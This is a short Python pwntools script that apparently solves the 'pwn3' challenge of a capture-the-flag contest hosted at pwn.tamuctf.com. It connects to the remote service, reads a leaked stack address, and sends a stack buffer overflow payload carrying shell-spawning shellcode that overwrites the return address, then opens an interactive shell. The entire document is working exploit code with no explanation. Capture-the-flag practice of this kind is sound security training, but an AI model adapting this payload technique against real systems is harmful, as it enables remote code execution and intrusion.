from pwn import *

#p = process('./pwn3')
p=remote("pwn.tamuctf.com",4323)

p.recvuntil('Take this, you might need it on your journey 0x')
res=p.recv(8)
print 'addr is:',res

addr=int(res,16)

shellcode = asm(shellcraft.sh())
payload=shellcode+'a'*(298-len(shellcode))+p32(1)+p32(addr)
p.sendline(payload)
p.interactive()
